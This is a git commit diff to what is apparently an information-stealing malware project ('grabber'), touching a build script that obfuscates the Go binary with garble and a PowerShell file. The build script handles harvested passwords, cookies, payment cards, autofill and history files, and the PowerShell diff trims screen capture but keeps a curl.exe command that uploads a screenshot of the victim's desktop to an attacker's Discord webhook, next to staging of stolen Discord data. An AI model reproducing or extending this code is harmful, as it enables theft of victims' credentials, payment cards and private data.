da7c3b4c4760624fd52638c70cdde4ac30772576
KDot227 <damndc227@gmail.com>
2024-04-19 21:10:35 -0500

    speed changes by removing unnessecarry screenshot

--- grabber-src/build.bat
+++ grabber-src/build.bat
@@ -1,10 +1,14 @@
 @echo off
 
+cd /d %~dp0
+
 if "%1"=="" (
     set "debug=0"
 ) else (
     set "debug=%1"
 )
+
+set GOOS=windows
 
 if %debug%==0 (
     garble -tiny build .
@@ -13,7 +17,7 @@ if %debug%==0 (
 
     del history.json || echo "history.json not found"
     del passwords.json || echo "passwords.json not found"
-    REM del cookies.txt || echo "cookies.txt not found"
+    del cookies_netscape.txt || echo "cookies.txt not found"
     del cards.json || echo "cards.json not found"
     del downloads.json || echo "downloads.json not found"
     del autofill.json || echo "autofill.json not found"
--- main.ps1
+++ main.ps1
@@ -828,20 +828,7 @@ function Backup-Data {
 
     $main_temp = "$env:localappdata\temp"
     $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
-    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
-    $screens = [Windows.Forms.Screen]::AllScreens
-    $top = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
-    $left = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
-    $width = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
-    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
-    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-    $bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
-    $graphics = [Drawing.Graphics]::FromImage($bmp)
-    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-    $bmp.Save("$main_temp\screenshot.png")
-    $graphics.Dispose()
-    $bmp.Dispose()
-    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n> :triangular_ruler: **Size:** $($bounds.width)x$($bounds.height)\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null
+    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null
 
     #TODO ill fix tokens tomorrow
     Move-Item "$main_temp\discord.json" $folder_general -Force	
